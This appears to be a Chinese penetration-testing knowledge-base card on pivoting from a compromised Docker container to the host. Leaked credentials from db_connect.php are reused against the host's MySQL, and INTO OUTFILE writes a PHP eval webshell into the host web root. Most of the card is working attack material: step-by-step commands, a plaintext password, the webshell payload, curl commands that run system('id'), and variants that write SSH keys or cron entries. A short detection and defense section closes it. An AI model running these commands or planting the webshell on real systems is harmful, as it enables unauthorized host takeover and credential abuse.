---
id: cloud-container-mysql-host-outfile-webshell-pivot
title: 容器内泄露 DB 凭据 → 连宿主机 MySQL 以 secure_file_priv 写宿主 Web 目录 getshell
type: scenario
domain: cloud
path: cloud/container
technique: container-host-mysql-outfile-webshell
aliases:
- Docker 容器横向宿主机 MySQL
- secure_file_priv 指向 webroot
- MySQL INTO OUTFILE 写宿主 Webshell
- 容器 DB 配置泄露 复用宿主
- Docker bridge 宿主服务
tags:
- container
- docker
- escape
- mysql
- into-outfile
- secure-file-priv
- webshell
- lateral-movement
- credential-reuse
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V282
  verified_at: '2026-11-08T05:01:03+08:00'
  notes: 已对照原文与60张截图核对：db_connect.php 凭据、secure_file_priv=/var/www/html/、INTO OUTFILE 写 backdoor.php、8080 访问均一致；未验证点：FILE 权限与宿主 bridge 可达性未独立复现；dup-scan 相关 pair 均为 related，保留本卡。
---

## 一句话结论

拿到容器内 WebShell 后，从容器 Web 目录的 `db_connect.php` 读到数据库账号密码，发现该凭据在宿主机 MySQL（Docker bridge 网关 `192.168.100.1:3306`）上同样有效，且宿主机 `secure_file_priv=/var/www/html/` 把文件写入限制在宿主 Web 根目录；用 `SELECT '<?php ... ?>' INTO OUTFILE '/var/www/html/backdoor.php'` 即可从容器内向宿主机 Web 目录写 WebShell，访问宿主 8080 端口 getshell，完成从容器到宿主机的横向。

## 原理

- **容器网络并非隔离墙**：容器通过 Docker bridge 访问宿主机网关（常见 `172.17.0.1`，本例 `192.168.100.1`）；宿主机上监听 `0.0.0.0` 的 MySQL 对容器完全可达。攻破容器后，容器成为攻击宿主机服务的跳板。
- **配置复用**：容器内 Web 应用的 `db_connect.php` 常保存数据库地址、用户、口令；开发/运维为省事会把同一组凭据用于宿主机 MySQL，或宿主机服务本身就是该应用的数据库。本例 `DB_SRV=192.168.100.1`、`admin:!123SecureAdminDashboard321!` 在宿主机 MySQL 上登录成功。
- **`secure_file_priv` 的“限制”反成利用点**：MySQL 的 `secure_file_priv` 若设为某个目录（本例 `/var/www/html/`），`INTO OUTFILE` 只能写该目录；而该目录正是宿主 Web 根目录，等价于给攻击者一个“只能写 WebShell”的任意文件写。
- **FILE 权限**：数据库用户 `admin` 具备 `FILE` 权限，`INTO OUTFILE` 才能落盘；若只有普通 DML 权限则失败。
- **为什么不是普通 SQL 注入写 shell**：攻击者已不在 Web 应用进程内，而是从容器网络直连宿主机数据库；写出的文件落在宿主机文件系统，而非容器层，因此绕过容器只读镜像/临时文件系统。
- **端口差异**：宿主机 80 端口是 WordPress，真正使用该数据库的应用在 8080；写 shell 前需确认 Web 根目录对应的站点端口与路径，否则 shell 落在不被解析的目录。

## 触发条件

- 已获得容器内代码执行/WebShell，可读取应用配置文件；
- 容器到宿主机网关的数据库端口可达（MySQL 监听非仅 127.0.0.1，或通过 host 网络）；
- 泄露的数据库凭据在宿主机 MySQL 上有效，且账户具备 `FILE` 权限；
- `secure_file_priv` 为空字符串或指向 Web 可访问目录；
- 宿主 Web 服务器会解析写入的文件类型（如 `.php`），且目录可写。

## 利用步骤

1. 容器内 `ifconfig`/`ip addr` 确认网段与网关，`cat /.dockerenv` 确认处于容器；`netstat -ntlp` 发现本地额外监听 3306。
2. 在 Web 目录搜索配置文件：`grep -r "DB_\|mysql\|password" /var/www`，读取 `db_connect.php` 得到 `DB_SRV/DB_USER/DB_PASSWD/DB_NAME`。
3. 先尝试本地 `mysql -u ... -p`（通常失败，因为服务在宿主机），再连网关：`mysql -h 192.168.100.1 -u admin -p`。
4. 确认权限与写目录：`show variables like '%secure%';`、`show grants;`。
5. 确认宿主 Web 根与端口：`curl http://192.168.100.1:8080/`，必要时用 `load_file` 读取 index.php 对比。
6. 写 WebShell：
   ```sql
   select '<?php echo 123;eval($_POST[\'r0ngy40\']);?>' into outfile '/var/www/html/backdoor.php'
   ```
7. 通过隧道/代理访问 `http://192.168.100.1:8080/backdoor.php`，POST `r0ngy40=system('id');` 验证命令执行；随后下载后续代理/木马，获取宿主机 shell。

## PoC

```sql
-- 连接宿主机 MySQL（凭据来自容器 Web 配置）
mysql -h 192.168.100.1 -u admin -p'!123SecureAdminDashboard321!'

-- 查看写文件限制与权限
show variables like '%secure%';
show grants;

-- 向宿主 Web 根目录写 PHP WebShell
select '<?php echo 123;eval($_POST[\'r0ngy40\']);?>'
into outfile '/var/www/html/backdoor.php';
```

```bash
# 验证
curl http://192.168.100.1:8080/backdoor.php
curl -d "r0ngy40=system('id');" http://192.168.100.1:8080/backdoor.php
```

## 变体与关联

- **变体**：`secure_file_priv` 为空时可直接写任意路径（SSH `authorized_keys`、cron、服务配置）；指向其他目录时可写对应站点/应用配置。
- **变体**：无 FILE 权限时改用 `general_log`/`slow_query_log` 写文件、UDF 提权、或利用数据库已有 job/存储过程。
- **变体**：容器到宿主机还可能通过 Docker Socket、host 网络、挂载目录、runc/docker cp 漏洞逃逸；本卡是“服务层横向”而非内核/运行时逃逸。
- **关联**：[[web-generic-sqli-mysql-outfile-general-log-webshell]]（INTO OUTFILE/general_log 写 WebShell 的通用手法）、[[cloud-container-docker-socket-tcp-escape]]（Docker Socket 逃逸）、[[cloud-container-host-dir-bind-mount-etc-crontab-escape]]（误挂宿主目录逃逸）、[[cloud-container-docker-privileged-host-disk-escape]]（特权容器挂宿主磁盘）、[[pentest-lateral-movement-sccm-client-push-ntlm-coercion-relay]]（另一种从容器/内网横向到宿主的手段）。

## 检测与防御

- **凭据隔离**：容器应用使用独立数据库账户，禁止与宿主机管理账户/其他服务复用；定期轮换；配置文件加密或使用密钥管理。
- **数据库暴露面**：MySQL 仅监听 `127.0.0.1` 或专用内网地址，不监听 Docker bridge 网关的 `0.0.0.0`；用防火墙限制容器网段访问 3306。
- **权限最小化**：应用账户只授予所需库的 DML 权限，撤销 `FILE`；`secure_file_priv` 指向空目录或 `NULL`，绝不能指向 Web 根。
- **文件系统**：Web 根目录对 Web 进程只读（上传目录单独挂载、禁止 PHP 执行）；监控 Web 目录新增 `.php` 文件与异常 `INTO OUTFILE` 语句。
- **检测**：容器内进程访问宿主机网关 3306、数据库日志出现 `INTO OUTFILE`、Web 根目录出现新脚本、容器内向宿主 8080 发起 HTTP，均可作为横向告警；结合容器运行时审计（exec、网络连接）定位跳板。
